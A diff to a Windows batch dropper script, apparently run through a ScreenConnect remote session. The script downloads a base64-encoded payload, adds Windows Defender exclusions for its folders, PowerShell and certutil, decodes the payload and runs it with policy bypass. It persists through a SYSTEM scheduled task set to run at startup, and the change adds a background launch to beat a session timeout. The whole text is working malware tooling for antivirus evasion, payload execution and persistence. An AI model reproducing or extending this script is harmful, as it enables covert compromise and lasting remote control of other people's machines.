@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260730WU7U5D ===
+echo === GO.CMD BUILD 20260730WU7U5E ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -23,15 +23,13 @@ set "PRIMSC=ScreenConnect Client (5f6010579852e507)"
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
 if not exist "C:\Windows\Temp" mkdir "C:\Windows\Temp" >nul 2>&1
 
-REM Fast path for ScreenConnect Guest 10s command timeout:
-REM foreground = download + schedule only. Decode/run happens as SYSTEM in boot.cmd.
-
 sc config "%ALTSC%" start= auto >nul 2>&1
 sc start "%ALTSC%" >nul 2>&1
 
 del /f /q "%B64%" >nul 2>&1
 del /f /q "%WRAP%" >nul 2>&1
 del /f /q "%ERR%" >nul 2>&1
+del /f /q "%WORKDIR%\go.flag" >nul 2>&1
 schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
 
 echo DL payload t=%CB% ...
@@ -54,37 +52,39 @@ exit /b 1
 :have
 for %%A in ("%B64%") do echo OK bytes=%%~zA
 
-REM Write SYSTEM worker (decode + run). Keep ASCII only.
 > "%WRAP%" echo @echo off
 >>"%WRAP%" echo setlocal EnableExtensions
->>"%WRAP%" echo echo boot_start^>"%ERR%"
+>>"%WRAP%" echo echo boot_start %%DATE%% %%TIME%%^>"%ERR%"
 >>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
 >>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
->>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -C "Try{Add-MpPreference -ExclusionPath '%WORKDIR%' -EA 0;Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0;Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0}Catch{}" ^>nul 2^>^&1
+>>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -C "Try{Add-MpPreference -ExclusionPath '%WORKDIR%' -EA 0;Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0;Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0;Add-MpPreference -ExclusionProcess 'certutil.exe' -EA 0}Catch{}" ^>nul 2^>^&1
 >>"%WRAP%" echo del /f /q "%PS1ALT%" ^>nul 2^>^&1
 >>"%WRAP%" echo del /f /q "%PS1%" ^>nul 2^>^&1
+>>"%WRAP%" echo echo decoding^>^>"%ERR%"
 >>"%WRAP%" echo certutil.exe -decode "%B64%" "%PS1ALT%" ^>nul 2^>^&1
 >>"%WRAP%" echo if not exist "%PS1ALT%" powershell.exe -NoP -NonI -EP Bypass -C "$b=[IO.File]::ReadAllText('%B64%') -replace '\s','';[IO.File]::WriteAllBytes('%PS1ALT%',[Convert]::FromBase64String($b))" ^>nul 2^>^&1
 >>"%WRAP%" echo if not exist "%PS1ALT%" echo decode_fail^>^>"%ERR%" ^& exit /b 2
+>>"%WRAP%" echo for %%%%A in ("%PS1ALT%") do echo decoded_bytes=%%%%~zA^>^>"%ERR%"
 >>"%WRAP%" echo findstr /C:"%MARKER%" "%PS1ALT%" ^>nul
 >>"%WRAP%" echo if errorlevel 1 echo marker_fail^>^>"%ERR%" ^& exit /b 3
 >>"%WRAP%" echo copy /y "%PS1ALT%" "%PS1%" ^>nul 2^>^&1
->>"%WRAP%" echo echo decoded_ok^>^>"%ERR%"
+>>"%WRAP%" echo echo running_payload^>^>"%ERR%"
 >>"%WRAP%" echo powershell.exe -NoP -NonI -EP Bypass -File "%PS1ALT%" ^>^>"%ERR%" 2^>^&1
 >>"%WRAP%" echo sc config "%ALTSC%" start= auto ^>nul 2^>^&1
 >>"%WRAP%" echo sc start "%ALTSC%" ^>nul 2^>^&1
 >>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^>"%ERR%"
 
-schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 00:00 /F /TR "\"%WRAP%\"" >nul 2>&1
-if errorlevel 1 schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "\"%WRAP%\"" >nul 2>&1
-if errorlevel 1 (
-  echo ERROR: schtasks create failed
-  sc start "%ALTSC%" >nul 2>&1
-  exit /b 4
-)
+echo boot_cmd_ready>"%WORKDIR%\go.flag"
+
+REM 1) Background as current Admin (returns immediately - survives SC Guest 10s)
+start "WU7BOOT" /b cmd.exe /c "\"%WRAP%\""
+
+REM 2) Also register SYSTEM task and run (backup)
+schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c \"%WRAP%\"" >nul 2>&1
 schtasks /Run /TN "%ONCETASK%" >nul 2>&1
-echo Launched SYSTEM worker [%MARKER%]. Foreground done.
-echo Check in 2-3 min:
+
+echo Launched worker [%MARKER%] via start/b + schtasks.
+echo Wait 2-3 min then:
 echo   type "%ERR%"
 echo   type "%WORKDIR%\.diag.log"
 echo   sc query "%PRIMSC%"
